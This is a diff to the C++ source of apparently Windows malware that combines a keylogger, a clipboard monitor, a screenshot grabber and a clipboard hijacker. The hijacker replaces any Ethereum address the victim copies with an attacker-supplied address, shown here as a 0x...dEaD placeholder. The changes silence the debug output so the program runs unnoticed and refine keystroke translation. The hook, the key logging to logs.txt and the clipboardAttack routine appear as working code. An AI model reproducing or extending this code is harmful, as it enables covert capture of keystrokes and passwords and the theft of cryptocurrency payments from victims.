@@ -48,12 +48,12 @@ std::wstring getWindowTitle(){
 
 std::wstring getClipboardText(){
 	if (OpenClipboard(NULL) == 0){
-		std::cout << "Error in openclipboard" << std::endl;
+		//std::cout << "Error in openclipboard" << std::endl;
 	}
 	HANDLE hdata = GetClipboardData(CF_UNICODETEXT);
 	wchar_t *pszText = static_cast<wchar_t *>( GlobalLock(hdata) );
 	if (pszText == NULL){
-		std::cout << "w 3lach" << std::endl;
+		//std::cout << "w 3lach" << std::endl;
 		CloseClipboard();
 		return (L"[Non-Text Copy]");
 	}
@@ -66,13 +66,13 @@ std::wstring getClipboardText(){
 the local needs to be associated with imbue() to the wide file stream in order to write any unicode to the file */
 
 void writeLogs(std::wstring buf, std::wstring windowTitle) {
-	const std::locale utf8_locale = std::locale("en_US.UTF-8");
+		const std::locale utf8_locale = std::locale("en_US.UTF-8");
 	std::wofstream logfile;
 
 	logfile.open("logs.txt", std::ios::app);
 	logfile.imbue(utf8_locale);
 	logfile << getDate();
-	logfile << " - \'";
+	logfile << L" - '";
 	logfile << windowTitle;
 	logfile << "' - ";
 	logfile << buf << std::endl;
@@ -98,7 +98,7 @@ void clipboardAttack(LPWSTR attackerAddress){
 	len = wcslen(attackerAddress); // Should be 42
 	cbText = getClipboardText();
 	if (isEthAddress(cbText, attackerAddress)){
-		std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
+		//std::cout << "ETH ADDRESS FOUND!!!!!!" << std::endl;
 		dstHandle = GlobalAlloc(GMEM_MOVEABLE,  (len + 1) * sizeof(WCHAR));
 		dstEthAddress = (LPWSTR)GlobalLock(dstHandle);
 		memcpy(dstEthAddress, attackerAddress, len * sizeof(WCHAR));
@@ -106,7 +106,7 @@ void clipboardAttack(LPWSTR attackerAddress){
 		GlobalUnlock(dstHandle);
 
 		if (OpenClipboard(NULL) == 0){
-		std::cout << "Error in openclipboard" << std::endl;
+		//std::cout << "Error in openclipboard" << std::endl;
 		}
 		EmptyClipboard();
 		SetClipboardData(CF_UNICODETEXT, dstHandle);
@@ -145,7 +145,7 @@ void	saveScreenToFile(HBITMAP hBitmap){
 	CImage image;
 	image.Attach(hBitmap);
 	std::string filename = getScreenFileName();
-	std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
+	//std::cout << "HRESULT : " << image.Save(filename.c_str()) << std::endl;
 }
 
 /* takeScreen() first sets the awareness context for window to get the correct screen dimensions then create a compatible bitmap*/
@@ -236,8 +236,12 @@ std::wstring translateKeys(DWORD vkCode, DWORD scanCode){
 		HKL keyboardLayout = GetKeyboardLayout(dwThreadID);
 		GetKeyState(VK_SHIFT);
         GetKeyState(VK_MENU);
+		//std::
 		if (GetKeyboardState(lpKeyState) == 0){
-			std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling
+			//std::cout << "!!!!!!!! ERROR IN KEYBOARD STATE" << std::endl; // add proper error handling
+		}
+		if (GetKeyState(VK_CONTROL) & 0x8000){
+			lpKeyState[VK_CONTROL] = 0;
 		}
 		int ret = ToUnicodeEx(vkCode, scanCode, lpKeyState, buff, 2, 0, keyboardLayout);
 		result += buff[0];
@@ -259,9 +263,9 @@ LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam){
     if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){
 		currentWindowTitle = getWindowTitle();
 		currentClipboardSequenceNumber = GetClipboardSequenceNumber();
-		std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
-		std::cout << "vk code: " << s->vkCode << std::endl;
-		std::cout << "scan code: " << s->scanCode << std::endl;
+		//std::cout << "clipboard sequence :" << GetClipboardSequenceNumber() << std::endl;
+		//std::cout << "vk code: " << s->vkCode << std::endl;
+		//std::cout << "scan code: " << s->scanCode << std::endl;
 		if (currentClipboardSequenceNumber != g_prevClipboardSequenceNumber){
 			writeClipboardChange();
 			clipboardAttack(L"0x000000000000000000000000000000000000dEaD");
